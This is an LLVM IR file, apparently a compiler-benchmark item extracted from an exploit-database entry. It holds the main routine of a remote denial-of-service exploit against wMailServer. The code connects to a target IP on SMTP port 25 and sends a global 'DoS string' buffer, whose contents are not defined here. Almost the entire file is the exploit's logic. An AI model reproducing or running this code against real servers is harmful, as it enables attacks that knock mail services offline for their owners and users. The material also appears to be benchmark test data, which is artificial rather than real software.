; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1101.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1101.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [43 x i8] c"wMailServer Remote D.o.S Exploit by Kozan\0A\00", align 1
@.str.1 = private unnamed_addr constant [38 x i8] c"Discovered by: fRoGGz - SecuBox Labs\0A\00", align 1
@.str.2 = private unnamed_addr constant [25 x i8] c"Exploit Coded by: Kozan\0A\00", align 1
@.str.3 = private unnamed_addr constant [42 x i8] c"Credits to ATmaCA, fRoGGz, SecuBox Labs\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [51 x i8] c"www.spyinstructors.com - kozan@spyinstructors.com\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [26 x i8] c"\0A\0AUsage: %s [Target IP]\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [16 x i8] c"Winsock error!\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [15 x i8] c"Socket error!\0A\00", align 1
@.str.8 = private unnamed_addr constant [20 x i8] c"Connection failed!\0A\00", align 1
@Buff = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [28 x i8] c"DoS string could not sent!\0A\00", align 1
@.str.10 = private unnamed_addr constant [24 x i8] c"Operation completed...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %9 = load i32, i32* @stdout, align 4
  %10 = call i32 (i32, i8*, ...) @fprintf(i32 %9, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str, i64 0, i64 0))
  %11 = load i32, i32* @stdout, align 4
  %12 = call i32 (i32, i8*, ...) @fprintf(i32 %11, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.1, i64 0, i64 0))
  %13 = load i32, i32* @stdout, align 4
  %14 = call i32 (i32, i8*, ...) @fprintf(i32 %13, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0))
  %15 = load i32, i32* @stdout, align 4
  %16 = call i32 (i32, i8*, ...) @fprintf(i32 %15, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.3, i64 0, i64 0))
  %17 = load i32, i32* @stdout, align 4
  %18 = call i32 (i32, i8*, ...) @fprintf(i32 %17, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.4, i64 0, i64 0))
  %19 = load i32, i32* %4, align 4
  %20 = icmp slt i32 %19, 2
  br i1 %20, label %21, label %27

21:                                               ; preds = %2
  %22 = load i32, i32* @stderr, align 4
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 (i32, i8*, ...) @fprintf(i32 %22, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.5, i64 0, i64 0), i8* %25)
  store i32 -1, i32* %3, align 4
  br label %82

27:                                               ; preds = %2
  %28 = call i64 @WSAStartup(i32 257, i32* %6)
  %29 = icmp slt i64 %28, 0
  br i1 %29, label %30, label %33

30:                                               ; preds = %27
  %31 = load i32, i32* @stderr, align 4
  %32 = call i32 (i32, i8*, ...) @fprintf(i32 %31, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %82

33:                                               ; preds = %27
  %34 = load i32, i32* @AF_INET, align 4
  %35 = load i32, i32* @SOCK_STREAM, align 4
  %36 = call i32 @socket(i32 %34, i32 %35, i32 0)
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %7, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %42

39:                                               ; preds = %33
  %40 = load i32, i32* @stderr, align 4
  %41 = call i32 (i32, i8*, ...) @fprintf(i32 %40, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %82

42:                                               ; preds = %33
  %43 = load i32, i32* @AF_INET, align 4
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  store i32 %43, i32* %44, align 4
  %45 = call i32 @htons(i32 25)
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %45, i32* %46, align 4
  %47 = load i8**, i8*** %5, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 1
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @inet_addr(i8* %49)
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  %52 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %51, i32 0, i32 0
  store i32 %50, i32* %52, align 4
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %54 = call i32 @memset(i32* %53, i8 signext 0, i32 8)
  %55 = load i32, i32* %7, align 4
  %56 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %57 = call i32 @connect(i32 %55, %struct.sockaddr* %56, i32 4)
  %58 = icmp eq i32 %57, -1
  br i1 %58, label %59, label %64

59:                                               ; preds = %42
  %60 = load i32, i32* @stderr, align 4
  %61 = call i32 (i32, i8*, ...) @fprintf(i32 %60, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.8, i64 0, i64 0))
  %62 = load i32, i32* %7, align 4
  %63 = call i32 @closesocket(i32 %62)
  store i32 -1, i32* %3, align 4
  br label %82

64:                                               ; preds = %42
  %65 = load i32, i32* %7, align 4
  %66 = load i32, i32* @Buff, align 4
  %67 = load i32, i32* @Buff, align 4
  %68 = call i32 @strlen(i32 %67)
  %69 = call i32 @send(i32 %65, i32 %66, i32 %68, i32 0)
  %70 = icmp eq i32 %69, -1
  br i1 %70, label %71, label %76

71:                                               ; preds = %64
  %72 = load i32, i32* @stderr, align 4
  %73 = call i32 (i32, i8*, ...) @fprintf(i32 %72, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.9, i64 0, i64 0))
  %74 = load i32, i32* %7, align 4
  %75 = call i32 @closesocket(i32 %74)
  store i32 -1, i32* %3, align 4
  br label %82

76:                                               ; preds = %64
  %77 = load i32, i32* @stdout, align 4
  %78 = call i32 (i32, i8*, ...) @fprintf(i32 %77, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.10, i64 0, i64 0))
  %79 = load i32, i32* %7, align 4
  %80 = call i32 @closesocket(i32 %79)
  %81 = call i32 (...) @WSACleanup()
  store i32 0, i32* %3, align 4
  br label %82

82:                                               ; preds = %76, %71, %59, %39, %30, %21
  %83 = load i32, i32* %3, align 4
  ret i32 %83
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i64 @WSAStartup(i32, i32*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @memset(i32*, i8 signext, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @closesocket(i32) #1

declare dso_local i32 @send(i32, i32, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @WSACleanup(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
